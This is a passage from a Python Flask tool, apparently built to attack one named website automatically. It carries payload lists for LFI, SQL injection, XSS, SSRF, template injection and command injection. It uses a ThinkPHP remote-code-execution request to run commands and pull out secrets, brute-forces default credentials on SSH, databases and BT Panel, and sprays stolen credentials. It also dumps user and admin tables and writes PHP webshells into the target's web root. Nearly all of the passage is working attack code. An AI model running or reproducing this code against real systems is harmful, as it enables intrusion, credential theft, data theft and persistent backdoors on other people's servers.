    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_payload, p) for p in payloads]
        for future in as_completed(futures):
            results.append(future.result())
    
    # If RCE verified, do automatic deep exploitation
    if attack_state['rce_verified']:
        _deep_rce_exploitation_async()
    
    return jsonify(results)

def _deep_rce_exploitation_async():
    """Background deep RCE exploitation"""
    def exploit():
        # Collect comprehensive system info
        commands = [
            'whoami', 'id', 'uname -a', 'hostname', 'pwd',
            'cat /etc/passwd', 'cat /etc/hosts',
            'ls -la /www/wwwroot/',
            'find /www -name "*.php" -o -name "*.env" -o -name "*.conf" 2>/dev/null | head -50',
            'ps aux | grep -E "mysql|redis|nginx|apache|php"',
            'netstat -tlnp',
            'env | grep -E "PASS|SECRET|KEY|TOKEN|DB|DATABASE"',
        ]
        
        for cmd in commands:
            try:
                payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
                r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
                increment_request_count()
                
                # Extract valuable info
                if r.status_code == 200 and len(r.text) > 20:
                    # Look for credentials
                    creds = re.findall(r'(?:password|passwd|pwd|secret|token|key)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                    if creds:
                        add_to_attack_state('discovered_credentials', creds)
                    
                    # Look for IPs
                    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r.text)
                    if ips:
                        add_to_attack_state('open_ports', [f"{ip}/unknown" for ip in ips[:10]])
            except:
                pass
        
        attack_state['current_shell'] = 'ThinkPHP RCE'
    threading.Thread(target=exploit).start()

# ============================================================
# COMPREHENSIVE VULNERABILITY SCANNING
# ============================================================
@app.route('/hunt/lfi-scan')
def lfi_scan():
    """Comprehensive LFI scanning"""
    lfi_payloads = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '/etc/passwd',
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=index',
        'php://filter/read=convert.base64-encode/resource=config/database',
        'php://filter/convert.base64-encode/resource=../config/database',
        'php://filter/convert.base64-encode/resource=../../.env',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'expect://whoami',
        '/var/log/nginx/access.log',
        '/proc/self/environ',
    ]
    
    results = []
    test_params = ['file', 'page', 'path', 'include', 'document', 'folder', 'template', 'lang', 'locale']
    
    for endpoint in attack_state['discovered_endpoints'][:20]:
        for param in test_params:
            for payload in lfi_payloads[:10]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={payload}"
                    r = requests.get(url, timeout=10, verify=False)
                    increment_request_count()
                    
                    if 'root:' in r.text or 'www-data' in r.text or '[boot]' in r.text:
                        results.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'vulnerable': True,
                            'evidence': r.text[:500]
                        })
                        add_to_attack_state('lfi_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

@app.route('/hunt/sqli-scan')
def sqli_scan():
    """Comprehensive SQL injection scanning"""
    sqli_payloads = [
        ("'", "Generic quote"),
        ("''", "Double quote"),
        ("' OR '1'='1", "OR injection"),
        ("' OR '1'='1' --", "OR with comment"),
        ("' OR '1'='1' #", "OR with hash"),
        ("admin' --", "Admin bypass"),
        ("admin' #", "Admin bypass hash"),
        ("' UNION SELECT NULL--", "Union select"),
        ("' UNION SELECT NULL,NULL--", "Union select 2"),
        ("' UNION SELECT NULL,NULL,NULL--", "Union select 3"),
        ("1' AND '1'='1", "AND true"),
        ("1' AND '1'='2", "AND false"),
        ("1' ORDER BY 1--", "Order by"),
        ("1' ORDER BY 100--", "Order by high"),
        ("'; SLEEP(5)--", "Time-based"),
        ("' OR SLEEP(5)--", "Time-based OR"),
        ("1' AND SLEEP(5)--", "Time-based AND"),
        ("' UNION SELECT @@version--", "Version extraction"),
        ("' UNION SELECT user()--", "User extraction"),
        ("' UNION SELECT database()--", "Database extraction"),
    ]
    
    results = []
    test_params = ['id', 'page', 'user', 'product', 'article', 'news', 'cat', 'category', 'item', 'view']
    
    for endpoint in attack_state['discovered_endpoints'][:20]:
        for param in test_params:
            for payload, description in sqli_payloads[:15]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={payload}"
                    r = requests.get(url, timeout=10, verify=False)
                    increment_request_count()
                    
                    body_lower = r.text.lower()
                    # SQL error indicators
                    sql_errors = [
                        'sql syntax', 'mysql_fetch', 'mysql error',
                        'ora-', 'postgresql', 'sqlite',
                        'unclosed quotation mark', 'unknown column',
                        'where clause', 'syntax error',
                        'warning: mysql', 'warning: pg_',
                        'valid mysql result', 'mysql_num_rows',
                    ]
                    
                    for error in sql_errors:
                        if error in body_lower:
                            results.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': description,
                                'vulnerable': True,
                                'error_indicator': error
                            })
                            add_to_attack_state('sqli_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                            break
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

@app.route('/hunt/xss-scan')
def xss_scan():
    """XSS vulnerability scanning"""
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        'javascript:alert(1)',
        '"><svg onload=alert(1)>',
        '\'-alert(1)-\'',
        '${alert(1)}',
        '{{constructor.constructor(\'alert(1)\')()}}',
    ]
    
    results = []
    test_params = ['q', 'search', 'query', 'id', 'name', 'email', 'message', 'comment', 'url', 'redirect']
    
    for endpoint in attack_state['discovered_endpoints'][:15]:
        for param in test_params:
            for payload in xss_payloads[:5]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={requests.utils.quote(payload)}"
                    r = requests.get(url, timeout=10, verify=False)
                    increment_request_count()
                    
                    if payload in r.text:
                        results.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'reflected': True
                        })
                        add_to_attack_state('xss_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

# ============================================================
# FULL AUTOMATED ATTACK CHAIN
# ============================================================
@app.route('/auto-attack/full-scan')
def full_auto_scan():
    """Execute complete automated attack lifecycle"""
    attack_state['scan_start_time'] = datetime.now().isoformat()
    
    results = {
        'phase1_recon': {},
        'phase2_discovery': {},
        'phase3_vulnerability': {},
        'phase4_exploitation': {},
        'phase5_post_exploitation': {},
    }
    
    # Phase 1: Reconnaissance
    results['phase1_recon'] = {
        'port_scan': _scan_all_ports(),
        'header_analysis': _check_headers_internal(),
        'technology_detection': _detect_technologies(),
        'dns_enumeration': _enumerate_dns(),
    }
    
    # Phase 2: Discovery
    results['phase2_discovery'] = {
        'endpoint_discovery': _discover_all_endpoints(),
        'backup_scan': _scan_backups_comprehensive(),
        'git_scan': _scan_git_comprehensive(),
        'file_discovery': _discover_sensitive_files(),
        'admin_panel_finder': _find_admin_panels(),
    }
    
    # Phase 3: Vulnerability Assessment
    results['phase3_vulnerability'] = {
        'config_extraction': _extract_all_configs(),
        'cookie_testing': _comprehensive_cookie_test(),
        'lfi_testing': _test_all_lfi(),
        'sqli_testing': _test_all_sqli(),
        'xss_testing': _test_all_xss(),
        'idor_testing': _test_all_idor(),
        'ssrf_testing': _test_all_ssrf(),
        'ssti_testing': _test_ssti(),
        'command_injection': _test_command_injection(),
    }
    
    # Phase 4: Exploitation
    if attack_state['open_ports']:
        results['phase4_exploitation'] = {
            'service_exploitation': _exploit_all_services(),
            'rce_payloads': _fire_all_rce_payloads(),
            'bt_panel_attack': _attack_bt_panel_comprehensive(),
            'credential_spray': _spray_credentials(),
        }
    
    # Phase 5: Post-Exploitation
    if attack_state['rce_verified'] or attack_state['discovered_credentials']:
        results['phase5_post_exploitation'] = {
            'credential_testing': _test_all_credentials_on_services(),
            'database_extraction': _extract_all_database_data(),
            'filesystem_exploration': _explore_filesystem_deep(),
            'webshell_deployment': _deploy_webshells(),
            'persistence_mechanisms': _check_persistence_mechanisms(),
            'lateral_movement': _attempt_lateral_movement(),
        }
    
    attack_state['scan_end_time'] = datetime.now().isoformat()
    
    return jsonify({
        'scan_complete': True,
        'results': results,
        'attack_state_summary': {
            'critical_findings': len([a for a in attack_state['attack_history'] if 'critical' in str(a).lower()]),
            'high_findings': len([a for a in attack_state['attack_history'] if 'high' in str(a).lower()]),
            'total_discoveries': sum(len(v) if isinstance(v, list) else 1 for v in attack_state.values() if v and isinstance(v, list)),
            'rce_achieved': attack_state['rce_verified'],
            'services_compromised': len(attack_state['database_info']),
            'credentials_found': len(attack_state['discovered_credentials']),
            'scan_duration': f"{datetime.now().isoformat()} to {attack_state['scan_end_time']}",
        }
    })

@app.route('/auto-attack/chain-exploit')
def chain_exploit():
    """Chain discovered vulnerabilities for maximum impact"""
    results = {}
    
    # If RCE achieved, use it for everything
    if attack_state['rce_verified']:
        results['rce_exploitation'] = _deep_rce_exploitation_sync()
    
    # If database credentials found, extract everything
    if attack_state['database_info']:
        results['database_exploitation'] = _full_database_extraction_sync()
    
    # Attack all open services
    if attack_state['open_ports']:
        results['service_exploitation'] = _attack_all_services_sync()
    
    # Exploit LFI for RCE
    if attack_state['lfi_vulnerabilities']:
        results['lfi_to_rce'] = _lfi_to_rce_sync()
    
    # Exploit SQLi for data extraction
    if attack_state['sqli_vulnerabilities']:
        results['sqli_exploitation'] = _exploit_sqli_sync()
    
    # Deploy webshells
    if attack_state['upload_endpoints'] or attack_state['rce_verified']:
        results['webshell_deployment'] = _deploy_webshells_sync()
    
    # Spray credentials across services
    if attack_state['discovered_credentials']:
        results['credential_spray'] = _spray_credentials_sync()
    
    return jsonify({
        'chain_exploit_complete': True,
        'results': results,
        'new_exploits': attack_state['successful_exploits'],
    })

# ============================================================
# INTERNAL SCANNING FUNCTIONS
# ============================================================
def _scan_all_ports():
    """Internal comprehensive port scan"""
    return _scan_ports_internal()

def _scan_ports_internal():
    """Internal port scanner"""
    common_ports = [
        (21, 'FTP'), (22, 'SSH'), (25, 'SMTP'), (53, 'DNS'),
        (80, 'HTTP'), (110, 'POP3'), (143, 'IMAP'), (443, 'HTTPS'),
        (993, 'IMAPS'), (995, 'POP3S'), (3306, 'MySQL'),
        (3389, 'RDP'), (5432, 'PostgreSQL'), (6379, 'Redis'),
        (8080, 'HTTP-Alt'), (8443, 'HTTPS-Alt'), (8888, 'BT Panel'),
        (27017, 'MongoDB'),
    ]
    
    open_ports = []
    for port, service in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            if result == 0:
                open_ports.append({'port': port, 'service': service})
                add_to_attack_state('open_ports', [f"{port}/{service}"])
        except:
            pass
    
    return open_ports

def _check_headers_internal():
    """Internal header analysis"""
    try:
        r = requests.get(TARGET, timeout=10, verify=False)
        increment_request_count()
        
        security_headers = {
            'X-Frame-Options': r.headers.get('X-Frame-Options', 'MISSING'),
            'X-Content-Type-Options': r.headers.get('X-Content-Type-Options', 'MISSING'),
            'Content-Security-Policy': r.headers.get('Content-Security-Policy', 'MISSING'),
            'Strict-Transport-Security': r.headers.get('Strict-Transport-Security', 'MISSING'),
            'X-XSS-Protection': r.headers.get('X-XSS-Protection', 'MISSING'),
            'Server': r.headers.get('Server', 'MISSING'),
            'X-Powered-By': r.headers.get('X-Powered-By', 'MISSING'),
        }
        
        # Detect technologies
        server = r.headers.get('Server', '')
        if 'nginx' in server.lower():
            attack_state['server_type'] = 'nginx'
        elif 'apache' in server.lower():
            attack_state['server_type'] = 'apache'
        
        if 'cloudflare' in server.lower() or 'cf-ray' in r.headers:
            attack_state['cloudflare_detected'] = True
        
        return {'headers': security_headers, 'all_headers': dict(r.headers)}
    except:
        return {'error': 'Failed to check headers'}

def _detect_technologies():
    """Detect technology stack"""
    try:
        r = requests.get(TARGET, timeout=10, verify=False)
        increment_request_count()
        
        tech = {}
        body = r.text.lower()
        
        tech['PHP'] = '.php' in str(r.url) or 'php' in r.headers.get('X-Powered-By', '').lower()
        tech['ThinkPHP'] = 'thinkphp' in body or 'think\\' in body
        tech['Vue.js'] = 'vue' in body or 'v-bind' in body
        tech['jQuery'] = 'jquery' in body
        tech['Bootstrap'] = 'bootstrap' in body
        tech['Nginx'] = 'nginx' in r.headers.get('Server', '').lower()
        
        add_to_attack_state('tech_stack', [k for k, v in tech.items() if v])
        
        return {'technologies': tech}
    except:
        return {'error': 'Failed to detect technologies'}

def _enumerate_dns():
    """Basic DNS enumeration"""
    try:
        ip = socket.gethostbyname(TARGET.replace('https://', '').replace('http://', ''))
        hostname = socket.gethostbyaddr(ip) if ip else None
        
        add_to_attack_state('dns_records', {
            'ip': ip,
            'hostname': str(hostname) if hostname else 'unknown'
        })
        
        return {'ip': ip, 'hostname': str(hostname) if hostname else 'unknown'}
    except:
        return {'error': 'DNS enumeration failed'}

def _discover_all_endpoints():
    """Comprehensive endpoint discovery"""
    return _discover_endpoints()

def _discover_endpoints():
    """Internal endpoint discovery"""
    # This function's implementation is handled by the proxy auto-discovery
    # and the /hunt/api-discovery endpoint
    return {'status': 'Endpoint discovery running via proxy and API fuzzer'}

def _scan_backups_comprehensive():
    """Comprehensive backup file scanning"""
    return _scan_backups_internal()

def _scan_backups_internal():
    """Internal backup scanner"""
    backup_patterns = [
        'backup.zip', 'backup.tar.gz', 'backup.rar', 'backup.sql',
        'www.zip', 'site.zip', '.env', '.env.backup',
        'config.php.bak', 'database.php.bak', 'dump.sql',
        'admin.php.bak', 'index.php.bak',
    ]
    
    found = []
    for pattern in backup_patterns:
        try:
            r = requests.get(f"{TARGET}/{pattern}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'file': pattern, 'size': len(r.text)})
                add_to_attack_state('backup_files', [pattern])
        except:
            pass
    
    return found

def _scan_git_comprehensive():
    """Comprehensive .git scanning"""
    return _scan_git_internal()

def _scan_git_internal():
    """Internal .git scanner"""
    git_paths = [
        '/.git/HEAD', '/.git/config', '/.git/index',
        '/.git/refs/heads/master', '/.git/refs/heads/main',
        '/.git/logs/HEAD',
    ]
    
    found = []
    for path in git_paths:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'path': path, 'size': len(r.text)})
                add_to_attack_state('git_files', [path])
        except:
            pass
    
    return found

def _discover_sensitive_files():
    """Discover sensitive files"""
    sensitive_files = [
        '/robots.txt', '/sitemap.xml', '/.env', '/.htaccess',
        '/phpinfo.php', '/info.php', '/test.php',
        '/admin.php', '/config.php', '/install.php',
        '/composer.json', '/package.json', '/README.md',
    ]
    
    found = []
    for file in sensitive_files:
        try:
            r = requests.get(f"{TARGET}{file}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'file': file, 'size': len(r.text)})
                add_to_attack_state('discovered_files', [file])
        except:
            pass
    
    return found

def _find_admin_panels():
    """Find admin panels"""
    admin_paths = [
        '/admin', '/administrator', '/wp-admin', '/login',
        '/admin/login', '/admin/index', '/dashboard',
        '/panel', '/manage', '/backend', '/cms',
        '/admin.php', '/login.php', '/admin.html',
    ]
    
    found = []
    for path in admin_paths:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=10, verify=False, allow_redirects=False)
            increment_request_count()
            if r.status_code in [200, 301, 302, 403]:
                found.append({'path': path, 'status': r.status_code})
                if 'login' in r.text.lower() or 'password' in r.text.lower():
                    add_to_attack_state('admin_urls', [path])
        except:
            pass
    
    return found

def _extract_all_configs():
    """Extract all configurations"""
    return _extract_configs()

def _extract_configs():
    """Internal config extraction"""
    config_paths = [
        '/index.php?s=index/think\\config/get&name=database',
        '/index.php?s=index/think\\config/get&name=database.password',
        '/index.php?s=index/think\\config/get&name=app',
    ]
    
    results = []
    for path in config_paths:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                # Extract passwords
                creds = re.findall(r'(?:password|passwd|pwd|secret|key|token)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                if creds:
                    add_to_attack_state('discovered_credentials', creds)
                results.append({'path': path, 'length': len(r.text), 'credentials_found': len(creds)})
        except:
            pass
    
    return results

def _comprehensive_cookie_test():
    """Comprehensive cookie testing"""
    return _test_cookies_internal()

def _test_cookies_internal():
    """Internal cookie testing"""
    cookie_values = [
        'admin', 'root', 'administrator', '1', 'true',
        '{"role":"admin"}', '{"is_admin":true}',
        'Marufbelay', '', "' or '1'='1",
    ]
    
    results = []
    for val in cookie_values:
        try:
            encoded = base64.b64encode(val.encode()).decode()
            r = requests.get(f"{TARGET}/index.php", cookies={'username': encoded}, timeout=10, verify=False)
            increment_request_count()
            results.append({
                'value': val,
                'status': r.status_code,
                'length': len(r.text),
                'potential_impact': len(r.text) > 500 and 'login' not in r.text.lower()
            })
        except:
            pass
    
    return results

def _test_all_lfi():
    """Test all LFI vulnerabilities"""
    return lfi_scan().get_json() if hasattr(lfi_scan(), 'get_json') else {'results': []}

def _test_all_sqli():
    """Test all SQLi vulnerabilities"""
    return sqli_scan().get_json() if hasattr(sqli_scan(), 'get_json') else {'results': []}

def _test_all_xss():
    """Test all XSS vulnerabilities"""
    return xss_scan().get_json() if hasattr(xss_scan(), 'get_json') else {'results': []}

def _test_all_idor():
    """Test all IDOR vulnerabilities"""
    # Using the existing IDOR endpoint
    return {'status': 'IDOR testing available via /hunt/idor-test'}

def _test_all_ssrf():
    """Test SSRF vulnerabilities"""
    ssrf_payloads = [
        'http://127.0.0.1', 'http://localhost',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        'http://metadata.google.internal/',  # GCP metadata
        'file:///etc/passwd',
        'gopher://127.0.0.1:6379/_INFO',  # Redis
    ]
    
    results = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in ssrf_payloads[:3]:
            try:
                r = requests.get(f"{TARGET}{endpoint}?url={payload}", timeout=10, verify=False)
                increment_request_count()
                if r.status_code == 200 and len(r.text) > 50:
                    results.append({'endpoint': endpoint, 'payload': payload, 'length': len(r.text)})
                    add_to_attack_state('ssrf_endpoints', [f"{endpoint}?url={payload}"])
            except:
                pass
    
    return results

def _test_ssti():
    """Test Server-Side Template Injection"""
    ssti_payloads = [
        '{{7*7}}', '${7*7}', '<%= 7*7 %>',
        '{{config}}', '{{self}}', '{{request}}',
        '${"test".toString().replace("t","T")}',
    ]
    
    results = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in ssti_payloads[:3]:
            try:
                r = requests.get(f"{TARGET}{endpoint}?name={payload}", timeout=10, verify=False)
                increment_request_count()
                if '49' in r.text or 'Test' in r.text:
                    results.append({'endpoint': endpoint, 'payload': payload, 'vulnerable': True})
                    add_to_attack_state('ssti_vulnerabilities', [f"{endpoint}?name={payload}"])
            except:
                pass
    
    return results

def _test_command_injection():
    """Test command injection"""
    cmd_payloads = [
        '; whoami', '| whoami', '`whoami`',
        '$(whoami)', '&& whoami', '|| whoami',
        '; id', '| id', '&& id',
    ]
    
    results = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in cmd_payloads[:5]:
            try:
                r = requests.get(f"{TARGET}{endpoint}?cmd={payload}", timeout=10, verify=False)
                increment_request_count()
                if 'root' in r.text or 'www-data' in r.text or 'uid=' in r.text:
                    results.append({'endpoint': endpoint, 'payload': payload, 'vulnerable': True})
                    add_to_attack_state('command_injection', [f"{endpoint}?cmd={payload}"])
            except:
                pass
    
    return results

def _exploit_all_services():
    """Exploit all discovered services"""
    return _exploit_services_internal()

def _exploit_services_internal():
    """Internal service exploitation"""
    results = {}
    
    for port_info in attack_state['open_ports_detailed']:
        port = port_info['port']
        
        if port == 22 and PARAMIKO_AVAILABLE:
            results['ssh'] = _try_ssh_bruteforce_internal()
        elif port == 21:
            results['ftp'] = _try_ftp_anonymous_internal()
        elif port == 3306 and PYMYSQL_AVAILABLE:
            results['mysql'] = _try_mysql_default_internal()
        elif port == 6379 and REDIS_AVAILABLE:
            results['redis'] = _try_redis_unauth_internal()
        elif port == 27017 and PYMONGO_AVAILABLE:
            results['mongodb'] = _try_mongodb_unauth_internal()
        elif port == 5432 and PSYCOPG2_AVAILABLE:
            results['postgresql'] = _try_postgresql_default_internal()
        elif port in [8888, 888]:
            results['bt_panel'] = _attack_bt_panel_internal()
    
    return results

def _try_ssh_bruteforce_internal():
    """Try SSH brute force"""
    common_creds = [
        ('root', 'root'), ('root', 'admin'), ('root', '123456'),
        ('admin', 'admin'), ('admin', '123456'), ('root', ''),
    ]
    
    for username, password in common_creds[:5]:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(TARGET_IP, port=22, username=username, password=password, timeout=5)
            ssh.close()
            creds = f"{username}:{password}"
            add_to_attack_state('discovered_credentials', [creds])
            attack_state['successful_exploits'] += 1
            return {'success': True, 'credentials': creds, 'service': 'SSH'}
        except:
            pass
    
    return {'success': False}

def _try_ftp_anonymous_internal():
    """Try FTP anonymous login"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET_IP, 21, timeout=5)
        ftp.login('anonymous', 'anonymous')
        files = ftp.nlst()[:20]
        ftp.quit()
        add_to_attack_state('discovered_credentials', ['anonymous:anonymous'])
        attack_state['successful_exploits'] += 1
        return {'success': True, 'files': files, 'service': 'FTP'}
    except:
        return {'success': False}

def _try_mysql_default_internal():
    """Try MySQL default credentials"""
    try:
        conn = pymysql.connect(host=TARGET_IP, port=3306, user='root', password='', connect_timeout=5)
        cursor = conn.cursor()
        cursor.execute("SELECT VERSION()")
        version = cursor.fetchone()
        
        # Get databases
        cursor.execute("SHOW DATABASES")
        databases = [db[0] for db in cursor.fetchall()]
        conn.close()
        
        add_to_attack_state('database_info', {
            'type': 'mysql',
            'host': TARGET_IP,
            'version': str(version),
            'databases': databases
        })
        add_to_attack_state('discovered_credentials', ['root:'])
        attack_state['successful_exploits'] += 1
        return {'success': True, 'version': str(version), 'databases': databases, 'service': 'MySQL'}
    except:
        return {'success': False}

def _try_redis_unauth_internal():
    """Try Redis unauthorized access"""
    try:
        r = redis.Redis(host=TARGET_IP, port=6379, socket_timeout=5)
        r.ping()
        info = str(r.info())[:500]
        keys = [k.decode() for k in r.keys('*')[:20]]
        add_to_attack_state('database_info', {'type': 'redis', 'host': TARGET_IP, 'keys': keys})
        attack_state['successful_exploits'] += 1
        return {'success': True, 'keys': keys, 'service': 'Redis'}
    except:
        return {'success': False}

def _try_mongodb_unauth_internal():
    """Try MongoDB unauthorized access"""
    try:
        from pymongo import MongoClient
        client = MongoClient(TARGET_IP, 27017, serverSelectionTimeoutMS=5000)
        dbs = client.list_database_names()
        client.close()
        add_to_attack_state('database_info', {'type': 'mongodb', 'host': TARGET_IP, 'databases': dbs})
        attack_state['successful_exploits'] += 1
        return {'success': True, 'databases': dbs, 'service': 'MongoDB'}
    except:
        return {'success': False}

def _try_postgresql_default_internal():
    """Try PostgreSQL default credentials"""
    try:
        conn = psycopg2.connect(host=TARGET_IP, port=5432, user='postgres', password='postgres', connect_timeout=5)
        cursor = conn.cursor()
        cursor.execute("SELECT version()")
        version = cursor.fetchone()
        conn.close()
        add_to_attack_state('database_info', {'type': 'postgresql', 'host': TARGET_IP, 'version': str(version)})
        add_to_attack_state('discovered_credentials', ['postgres:postgres'])
        attack_state['successful_exploits'] += 1
        return {'success': True, 'version': str(version), 'service': 'PostgreSQL'}
    except:
        return {'success': False}

def _attack_bt_panel_internal():
    """Attack BT Panel"""
    bt_creds = [
        ('admin', 'admin'), ('admin', '123456'), ('admin', 'admin123'),
    ]
    
    for port in [8888, 888]:
        for username, password in bt_creds:
            try:
                session = requests.Session()
                r = session.get(f"http://{TARGET_IP}:{port}/login", timeout=5)
                r = session.post(f"http://{TARGET_IP}:{port}/login", 
                               data={'username': username, 'password': password}, timeout=5)
                if 'dashboard' in r.text.lower() or 'success' in r.text.lower():
                    creds = f"bt_panel:{username}:{password}"
                    add_to_attack_state('discovered_credentials', [creds])
                    attack_state['bt_panel_url'] = f"http://{TARGET_IP}:{port}"
                    attack_state['bt_panel_credentials'] = creds
                    attack_state['successful_exploits'] += 1
                    return {'success': True, 'credentials': creds, 'port': port, 'service': 'BT Panel'}
            except:
                pass
    
    return {'success': False}

def _fire_all_rce_payloads():
    """Fire all RCE payloads"""
    return rce_payloads().get_json() if hasattr(rce_payloads(), 'get_json') else {'results': []}

def _attack_bt_panel_comprehensive():
    """Comprehensive BT Panel attack"""
    return _attack_bt_panel_internal()

def _spray_credentials():
    """Spray discovered credentials across services"""
    results = []
    
    for cred in attack_state['discovered_credentials'][:20]:
        if ':' in cred:
            parts = cred.split(':')
            username = parts[0]
            password = ':'.join(parts[1:]) if len(parts) > 2 else parts[1]
            
            # Try on SSH
            if PARAMIKO_AVAILABLE:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(TARGET_IP, port=22, username=username, password=password, timeout=3)
                    ssh.close()
                    results.append({'credential': cred, 'service': 'SSH', 'success': True})
                    attack_state['successful_exploits'] += 1
                except:
                    pass
            
            # Try on MySQL
            if PYMYSQL_AVAILABLE:
                try:
                    conn = pymysql.connect(host=TARGET_IP, port=3306, user=username, password=password, connect_timeout=3)
                    conn.close()
                    results.append({'credential': cred, 'service': 'MySQL', 'success': True})
                    attack_state['successful_exploits'] += 1
                except:
                    pass
    
    return results

def _test_all_credentials_on_services():
    """Test all credentials on all services"""
    return _spray_credentials()

def _extract_all_database_data():
    """Extract all database data"""
    return _full_database_extraction_sync()

def _full_database_extraction_sync():
    """Synchronous full database extraction"""
    results = {}
    
    if 'mysql' in str(attack_state['database_info']).lower() and PYMYSQL_AVAILABLE:
        try:
            conn = pymysql.connect(host=TARGET_IP, port=3306, user='root', password='', connect_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            
            for db in databases[:5]:
                db_name = db[0]
                try:
                    cursor.execute(f"USE {db_name}")
                    cursor.execute("SHOW TABLES")
                    tables = cursor.fetchall()
                    
                    for table in tables[:10]:
                        table_name = table[0]
                        if any(t in table_name.lower() for t in ['user', 'admin', 'member', 'account', 'config']):
                            try:
                                cursor.execute(f"SELECT * FROM {table_name} LIMIT 5")
                                rows = cursor.fetchall()
                                columns = [desc[0] for desc in cursor.description]
                                results[f"{db_name}.{table_name}"] = {
                                    'columns': columns,
                                    'row_count': len(rows),
                                    'sample': str(rows)[:500]
                                }
                            except:
                                pass
                except:
                    pass
            
            conn.close()
        except:
            pass
    
    return results

def _explore_filesystem_deep():
    """Deep filesystem exploration using RCE"""
    if not attack_state['rce_verified']:
        return {'error': 'RCE not verified'}
    
    commands = [
        'find /www -type f -name "*.php" | head -50',
        'find /www -type f -name "*.env" | head -20',
        'find /www -type f -name "*.conf" | head -20',
        'ls -laR /www/wwwroot/ | head -100',
    ]
    
    results = []
    for cmd in commands:
        try:
            payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
            r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
            increment_request_count()
            if r.status_code == 200:
                results.append({'command': cmd, 'output': r.text[:1000]})
        except:
            pass
    
    return results

def _deploy_webshells():
    """Deploy webshells"""
    return _deploy_webshells_sync()

def _deploy_webshells_sync():
    """Synchronous webshell deployment"""
    results = []
    
    # If RCE, write webshell directly
    if attack_state['rce_verified']:
        webshells = [
            ('shell.php', '<?php @eval($_POST["cmd"]); ?>'),
            ('shell2.php', '<?php system($_GET["cmd"]); ?>'),
            ('shell3.php', '<?php echo shell_exec($_REQUEST["cmd"]); ?>'),
        ]
        
        for filename, code in webshells:
            encoded_code = base64.b64encode(code.encode()).decode()
            cmd = f'echo {encoded_code} | base64 -d > /www/wwwroot/invest307.fa/{filename}'
            try:
                payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
                r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
                increment_request_count()
                
                # Verify webshell
                try:
                    verify = requests.get(f"{TARGET}/{filename}", timeout=5)
                    if verify.status_code == 200:
                        results.append({'webshell': f"{TARGET}/{filename}", 'status': 'deployed'})
                        add_to_attack_state('webshell_locations', [f"{TARGET}/{filename}"])
                except:
                    pass
            except:
                pass
    
    return results

def _check_persistence_mechanisms():
    """Check for persistence mechanisms"""
    if not attack_state['rce_verified']:
        return {'error': 'RCE not verified'}
    
    checks = [
        'crontab -l 2>/dev/null',
        'cat /etc/crontab 2>/dev/null',
        'ls -la /etc/cron.*/ 2>/dev/null',
        'systemctl list-units --type=service --state=running 2>/dev/null | head -20',
    ]
    
    results = []
    for cmd in checks:
        try:
            payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
            r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
            increment_request_count()
            if r.status_code == 200 and len(r.text) > 10:
                results.append({'check': cmd, 'output': r.text[:500]})
        except:
            pass
    
    return results

def _attempt_lateral_movement():
    """Attempt lateral movement"""
    if not attack_state['rce_verified']:
        return {'error': 'RCE not verified'}
    
    # Check for internal network access
    commands = [
        'arp -a 2>/dev/null',
        'cat /etc/hosts',
        'ip route 2>/dev/null',
        'cat ~/.ssh/known_hosts 2>/dev/null',
